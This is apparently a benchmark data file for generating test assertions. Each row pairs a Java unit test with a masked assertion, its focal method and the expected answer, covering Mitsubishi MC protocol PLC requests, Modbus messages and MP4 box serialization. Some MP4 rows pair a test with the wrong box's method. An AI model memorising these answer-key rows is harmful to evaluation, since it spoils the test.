"testCreateWriteDeviceRandomInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x46, 0x00, 0x0C, 0x00, 0x02, 0x14, 0x02, 0x00, 0x04, 0x03, 0x00, 0x00, 0x00, 0x00, (byte) 0xA8, 0x00, 0x50, 0x05, 0x01, 0x00, 0x00, 0x00, (byte) 0xA8, 0x00, 0x75, 0x05, 0x64, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x40, 0x05, 0x20, 0x00, 0x00, 0x00, (byte) 0x9C, 0x00, (byte) 0x83, 0x05, (byte) 0xDC, 0x05, 0x00, 0x00, (byte) 0xA8, 0x00, 0x02, 0x12, 0x39, 0x04, 0x60, 0x01, 0x00, 0x00, (byte) 0x9D, 0x00, 0x07, 0x26, 0x75, 0x23, 0x57, 0x04, 0x00, 0x00, (byte) 0x90, 0x00, 0x75, 0x04, 0x25, 0x04 }; List<McDeviceContent> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 0, new byte[]{0x50, 0x05})); wordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 1, new byte[]{0x75, 0x05})); wordAddresses.add(new McDeviceContent(EMcDeviceCode.M, 100, new byte[]{0x40, 0x05})); wordAddresses.add(new McDeviceContent(EMcDeviceCode.X, 0x20, new byte[]{(byte) 0x83, 0x05}));  List<McDeviceContent> dwordAddresses = new ArrayList<>(); dwordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 1500, new byte[]{0x02, 0x12, 0x39, 0x04})); dwordAddresses.add(new McDeviceContent(EMcDeviceCode.Y, 0x160, new byte[]{0x07, 0x26, 0x75, 0x23})); dwordAddresses.add(new McDeviceContent(EMcDeviceCode.M, 1111, new byte[]{0x75, 0x04, 0x25, 0x04})); McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createWriteDeviceRandomInWordReq(EMcSeries.IQ_R, header, wordAddresses, dwordAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceRandomInWordReq(EMcSeries series, McHeaderReq header, List<McDeviceContent> wordContents, List<McDeviceContent> dwordContents) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_RANDOM_WRITE_IN_WORD.getCode()); } McWriteDeviceRandomInWordReqData data = new McWriteDeviceRandomInWordReqData(series, wordContents, dwordContents); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createWriteDeviceRandomInBitReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x11, 0x00, 0x0C, 0x00, 0x02, 0x14, 0x01, 0x00, 0x02, 0x32, 0x00, 0x00, (byte) 0x90, 0x00, 0x2F, 0x00, 0x00, (byte) 0x9D, 0x01, }; List<McDeviceContent> bitAddresses = new ArrayList<>(); bitAddresses.add(new McDeviceContent(EMcDeviceCode.M, 50, new byte[]{0x00})); bitAddresses.add(new McDeviceContent(EMcDeviceCode.Y, 0x2F, new byte[]{0x01})); McMessageReq req = McReqBuilder.createWriteDeviceRandomInBitReq(bitAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceRandomInBitReq(List<McDeviceContent> bitContents) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createWriteDeviceRandomInBitReq(EMcSeries.QnA, header, bitContents); }"	assertArrayEquals(expect, actual)
"testCreateWriteDeviceRandomInBitReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x15, 0x00, 0x0C, 0x00, 0x02, 0x14, 0x03, 0x00, 0x02, 0x32, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x00, 0x2F, 0x00, 0x00, 0x00, (byte) 0x9D, 0x00, 0x01, }; List<McDeviceContent> bitAddresses = new ArrayList<>(); bitAddresses.add(new McDeviceContent(EMcDeviceCode.M, 50, new byte[]{0x00})); bitAddresses.add(new McDeviceContent(EMcDeviceCode.Y, 0x2F, new byte[]{0x01})); McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createWriteDeviceRandomInBitReq(EMcSeries.IQ_R, header, bitAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceRandomInBitReq(EMcSeries series, McHeaderReq header, List<McDeviceContent> bitContents) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_RANDOM_WRITE_IN_BIT.getCode()); } McWriteDeviceRandomInBitReqData data = new McWriteDeviceRandomInBitReqData(series, bitContents); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createReadDeviceBatchMultiBlocksReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x26, 0x00, 0x0C, 0x00, 0x06, 0x04, 0x00, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, (byte) 0xA8, 0x04, 0x00, 0x00, 0x01, 0x00, (byte) 0xB4, 0x08, 0x00, 0x00, 0x00, 0x00, (byte) 0x90, 0x02, 0x00, (byte) 0x80, 0x00, 0x00, (byte) 0x90, 0x02, 0x00, 0x00, 0x01, 0x00, (byte) 0xA0, 0x03, 0x00 }; List<McDeviceAddress> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.D, 0, 4)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.W, 0x100, 8));  List<McDeviceAddress> bitAddresses = new ArrayList<>(); bitAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 0, 2)); bitAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 128, 2)); bitAddresses.add(new McDeviceAddress(EMcDeviceCode.B, 0x100, 3)); McMessageReq req = McReqBuilder.createReadDeviceBatchMultiBlocksReq(wordAddresses, bitAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceBatchMultiBlocksReq(List<McDeviceAddress> wordAddresses, List<McDeviceAddress> bitAddresses) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createReadDeviceBatchMultiBlocksReq(EMcSeries.QnA, header, wordAddresses, bitAddresses); }"	assertArrayEquals(expect, actual)
"testCreateReadDeviceBatchMultiBlocksReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x30, 0x00, 0x0C, 0x00, 0x06, 0x04, 0x02, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, (byte) 0xA8, 0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, (byte) 0xB4, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x02, 0x00, (byte) 0x80, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x02, 0x00, 0x00, 0x01, 0x00, 0x00, (byte) 0xA0, 0x00, 0x03, 0x00 }; List<McDeviceAddress> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.D, 0, 4)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.W, 0x100, 8));  List<McDeviceAddress> bitAddresses = new ArrayList<>(); bitAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 0, 2)); bitAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 128, 2)); bitAddresses.add(new McDeviceAddress(EMcDeviceCode.B, 0x100, 3)); McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createReadDeviceBatchMultiBlocksReq(EMcSeries.IQ_R, header, wordAddresses, bitAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceBatchMultiBlocksReq(EMcSeries series, McHeaderReq header, List<McDeviceAddress> wordAddresses, List<McDeviceAddress> bitAddresses) { McReadDeviceBatchMultiBlocksReqData data = new McReadDeviceBatchMultiBlocksReqData(series, wordAddresses, bitAddresses); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createWriteDeviceBatchMultiBlocksReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x4C, 0x00, 0x0C, 0x00, 0x06, 0x14, 0x00, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, (byte) 0xA8, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, (byte) 0xB4, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0x90, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0x80, 0x00, 0x00, (byte) 0x90, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, (byte) 0xA0, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; List<McDeviceContent> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 0, 4, new byte[8])); wordAddresses.add(new McDeviceContent(EMcDeviceCode.W, 0x100, 8, new byte[16]));  List<McDeviceContent> bitAddresses = new ArrayList<>(); bitAddresses.add(new McDeviceContent(EMcDeviceCode.M, 0, 2, new byte[4])); bitAddresses.add(new McDeviceContent(EMcDeviceCode.M, 128, 2, new byte[4])); bitAddresses.add(new McDeviceContent(EMcDeviceCode.B, 0x100, 3, new byte[6])); McMessageReq req = McReqBuilder.createWriteDeviceBatchMultiBlocksReq(wordAddresses, bitAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceBatchMultiBlocksReq(List<McDeviceContent> wordContents, List<McDeviceContent> bitContents) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createWriteDeviceBatchMultiBlocksReq(EMcSeries.QnA, header, wordContents, bitContents); }"	assertArrayEquals(expect, actual)
"testCreateWriteDeviceBatchMultiBlocksReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x56, 0x00, 0x0C, 0x00, 0x06, 0x14, 0x02, 0x00, 0x02, 0x03, 0x00, 0x00, 0x00, 0x00, (byte) 0xA8, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, (byte) 0xB4, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0x80, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, (byte) 0xA0, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; List<McDeviceContent> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 0, 4, new byte[8])); wordAddresses.add(new McDeviceContent(EMcDeviceCode.W, 0x100, 8, new byte[16]));  List<McDeviceContent> bitAddresses = new ArrayList<>(); bitAddresses.add(new McDeviceContent(EMcDeviceCode.M, 0, 2, new byte[4])); bitAddresses.add(new McDeviceContent(EMcDeviceCode.M, 128, 2, new byte[4])); bitAddresses.add(new McDeviceContent(EMcDeviceCode.B, 0x100, 3, new byte[6])); McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createWriteDeviceBatchMultiBlocksReq(EMcSeries.IQ_R, header, wordAddresses, bitAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceBatchMultiBlocksReq(EMcSeries series, McHeaderReq header, List<McDeviceContent> wordContents, List<McDeviceContent> bitContents) { McWriteDeviceBatchMultiBlocksReqData data = new McWriteDeviceBatchMultiBlocksReqData(series, wordContents, bitContents); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"readWriteBooleanOutRange() { List<Boolean> data = new ArrayList<>(); for (int i = 0; i < 7170; i++) { data.add(false); } this.mcPLC.writeBoolean(""M110"", data); // 超范围读取 List<Boolean> booleanList = this.mcPLC.readBoolean(""M110"", 7170); ""<AssertPlaceHolder>""; }
readBoolean(String address, int count) { // 三菱1个字节对应两个boolean McDeviceAddress deviceAddress = McDeviceAddress.createBy(address, count); McDeviceContent deviceContent = this.readDeviceBatchInBit(deviceAddress); List<Boolean> res = this.getBooleansBy(deviceContent.getData()); return res.subList(0, count); }"	assertEquals(7170, booleanList.size())
"readWriteBytesOutRange() { // 超范围写入 this.mcPLC.writeBytes(""D110"", new byte[3848]); // 超范围读取 byte[] d110s = this.mcPLC.readBytes(""D110"", 1924); ""<AssertPlaceHolder>"";  }
readBytes(String address, int count) { // 三菱1个字占2个字节 int newCount = count % 2 == 0 ? (count / 2) : ((count + 1) / 2); McDeviceAddress deviceAddress = McDeviceAddress.createBy(address, newCount); McDeviceContent deviceContent = this.readDeviceBatchInWord(deviceAddress); return ByteReadBuff.newInstance(deviceContent.getData()).getBytes(count); }"	assertEquals(1924, d110s.length)
"toByteArray() { MbReadCoilResponse mb = new MbReadCoilResponse(); mb.setFunctionCode(EMbFunctionCode.READ_COIL); mb.setCount(3); mb.setCoilStatus(new byte[]{(byte) 0xCD, (byte) 0x6B, (byte) 0x05}); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putByte(this.count) .putBytes(this.coilStatus) .getData(); }"	assertArrayEquals(new byte[]{(byte) 0x01, (byte) 0x03, (byte) 0xCD, (byte) 0x6B, (byte) 0x05}, mb.toByteArray())
"toByteArray() { MbReadDiscreteInputResponse mb = new MbReadDiscreteInputResponse(); mb.setFunctionCode(EMbFunctionCode.READ_DISCRETE_INPUT); mb.setCount(3); mb.setInputStatus(new byte[]{(byte) 0xAC, (byte) 0xDB, (byte) 0x35}); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putByte(this.count) .putBytes(this.inputStatus) .getData(); }"	assertArrayEquals(new byte[]{(byte) 0x02, (byte) 0x03, (byte) 0xAC, (byte) 0xDB, (byte) 0x35}, mb.toByteArray())
"toByteArray() { MbReadHoldRegisterResponse mb = new MbReadHoldRegisterResponse(); mb.setFunctionCode(EMbFunctionCode.READ_HOLD_REGISTER); mb.setCount(6); mb.setRegister(new byte[]{(byte) 0x02, (byte) 0x2B, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x64}); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putByte(this.count) .putBytes(this.register) .getData(); }"	assertArrayEquals(new byte[]{(byte) 0x03, (byte) 0x06, (byte) 0x02, (byte) 0x2B, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x64}, mb.toByteArray())
"toByteArray() { MbReadInputRegisterResponse mb = new MbReadInputRegisterResponse(); mb.setFunctionCode(EMbFunctionCode.READ_INPUT_REGISTER); mb.setCount(2); mb.setRegister(new byte[]{(byte) 0x00, (byte) 0x0A}); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putByte(this.count) .putBytes(this.register) .getData(); }"	assertArrayEquals(new byte[]{(byte) 0x04, (byte) 0x02, (byte) 0x00, (byte) 0x0A}, mb.toByteArray())
"toByteArray() { byte[] actual = new byte[]{(byte) 0x0F, (byte) 0x00, (byte) 0x13, (byte) 0x00, (byte) 0x0A, (byte) 0x02, (byte) 0xCD, (byte) 0x01}; MbWriteMultipleCoilRequest mb = new MbWriteMultipleCoilRequest(); mb.setFunctionCode(EMbFunctionCode.WRITE_MULTIPLE_COIL); mb.setAddress(19); mb.setQuantity(10); mb.setCount(2); mb.setValue(new byte[]{(byte) 0xCD, (byte) 0x01}); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putShort(this.address) .putShort(this.quantity) .putByte(this.count) .putBytes(this.value) .getData(); }"	assertArrayEquals(actual, mb.toByteArray())
"toByteArray() { byte[] actual = new byte[]{(byte) 0x0F, (byte) 0x00, (byte) 0x13, (byte) 0x00, (byte) 0x0A}; MbWriteMultipleCoilResponse mb = new MbWriteMultipleCoilResponse(); mb.setFunctionCode(EMbFunctionCode.WRITE_MULTIPLE_COIL); mb.setAddress(19); mb.setQuantity(10); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putShort(this.address) .putShort(this.quantity) .getData(); }"	assertArrayEquals(actual, mb.toByteArray())
"toByteArray() { byte[] actual = new byte[]{(byte) 0x10, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x02, (byte) 0x04, (byte) 0x00, (byte) 0x0A, (byte) 0x01, (byte) 0x02}; MbWriteMultipleRegisterRequest mb = new MbWriteMultipleRegisterRequest(); mb.setFunctionCode(EMbFunctionCode.WRITE_MULTIPLE_REGISTER); mb.setAddress(1); mb.setQuantity(2); mb.setCount(4); mb.setValue(new byte[]{(byte) 0x00, (byte) 0x0A, (byte) 0x01, (byte) 0x02}); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putShort(this.address) .putShort(this.quantity) .putByte(this.count) .putBytes(this.value) .getData(); }"	assertArrayEquals(actual, mb.toByteArray())
"toByteArray() { byte[] actual = new byte[]{(byte) 0x10, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x02}; MbWriteMultipleRegisterResponse mb = new MbWriteMultipleRegisterResponse(); mb.setFunctionCode(EMbFunctionCode.WRITE_MULTIPLE_REGISTER); mb.setAddress(1); mb.setQuantity(2); ""<AssertPlaceHolder>""; }
toByteArray() { return ByteWriteBuff.newInstance(this.byteArrayLength()) .putByte(this.functionCode.getCode()) .putShort(this.address) .putShort(this.quantity) .getData(); }"	assertArrayEquals(actual, mb.toByteArray())
"mp4FtypBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x00, 0x01, 0x69, 0x73, 0x6F, 0x6D, 0x61, 0x76, 0x63, 0x31 }; Mp4FtypBox box = new Mp4FtypBox(); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putString(this.majorBrand) .putInteger(this.minorVersion) .putString(this.compatibleBrands) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MoofBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, (byte) 0x82, 0x6D, 0x6F, 0x6F, 0x66,  0x00, 0x00, 0x00, 0x10, 0x6D, 0x66, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, 0x6A, 0x74, 0x72, 0x61, 0x66,  0x00, 0x00, 0x00, 0x10, 0x74, 0x66, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, 0x10, 0x74, 0x66, 0x64, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x34, 0x74, 0x72, 0x75, 0x6E, 0x00, 0x00, 0x0F, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, (byte) 0x8A, 0x00, 0x00, 0x0E, 0x10, 0x00, 0x00, 0x15, 0x57, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x10, 0x00, 0x00, 0x13, (byte) 0x86, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x0E, 0x73, 0x64, 0x74, 0x70, 0x00, 0x00, 0x00, 0x00, 0x20, 0x10 }; Mp4MoofBox box = new Mp4MoofBox(1, 0, this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MfhdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x10, 0x6D, 0x66, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 }; Mp4MfhdBox box = new Mp4MfhdBox(1); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TrafBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x6A, 0x74, 0x72, 0x61, 0x66,  0x00, 0x00, 0x00, 0x10, 0x74, 0x66, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,  0x00, 0x00, 0x00, 0x10, 0x74, 0x66, 0x64, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x34, 0x74, 0x72, 0x75, 0x6E, 0x00, 0x00, 0x0F, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, (byte) 0x8A, 0x00, 0x00, 0x0E, 0x10, 0x00, 0x00, 0x15, 0x57, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x10, 0x00, 0x00, 0x13, (byte) 0x86, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x0E, 0x73, 0x64, 0x74, 0x70, 0x00, 0x00, 0x00, 0x00, 0x20, 0x10 }; Mp4TrafBox box = new Mp4TrafBox(0, this.trackInfo); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TfhdBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x10, 0x74, 0x66, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 }; Mp4TfhdBox box = new Mp4TfhdBox(1); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TfdtBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x10, 0x74, 0x66, 0x64, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; Mp4TfdtBox box = new Mp4TfdtBox(0); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4TrunBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x34, 0x74, 0x72, 0x75, 0x6E, 0x00, 0x00, 0x0F, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, (byte) 0x8A,  0x00, 0x00, 0x0E, 0x10, 0x00, 0x00, 0x15, 0x57, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x0E, 0x10, 0x00, 0x00, 0x13, (byte) 0x86, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, };  Mp4TrunBox box = new Mp4TrunBox(this.samples); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4SdtpBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x0E, 0x73, 0x64, 0x74, 0x70, 0x00, 0x00, 0x00, 0x00, 0x20, 0x10 }; Mp4SdtpBox box = new Mp4SdtpBox(this.samples); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MdatBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x00, 0x0C, 0x6D, 0x64, 0x61, 0x74, 0x00, 0x00, 0x00, 0x00 }; Mp4MdatBox box = new Mp4MdatBox(new byte[4]); ""<AssertPlaceHolder>""; }
toByteArray() { int size = this.byteArrayLength(); return ByteWriteBuff.newInstance(size) .putInteger(size) .putBytes(this.mp4Type.getByteArray()) .putBytes(this.mfhdBox.toByteArray()) .putBytes(this.trafBox.toByteArray()) .getData(); }"	assertArrayEquals(expect, box.toByteArray())
"mp4MoovBox() { byte[] expect = new byte[]{ 0x00, 0x00, 0x02, (byte) 0x83, 0x6D, 0x6F, 0x6F, 0x76,  0x00, 0x00, 0x00, 0x6C, 0x6D, 0x76, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,  0x00, 0x00, 0x01, (byte) 0xE7, 0x74, 0x72, 0x61, 0x6B, 0x00, 0x00, 0x00, 0x5C, 0x74, 0x6B, 0x68, 0x64, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x5F, (byte) 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x07, (byte) 0x80, 0x00, 0x00, 0x04, 0x38, 0x00, 0x00, 0x00, 0x00, 0x01, (byte) 0x83, 0x6D, 0x64, 0x69, 0x61, 0x00, 0x00, 0x00, 0x20, 0x6D, 0x64, 0x68, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 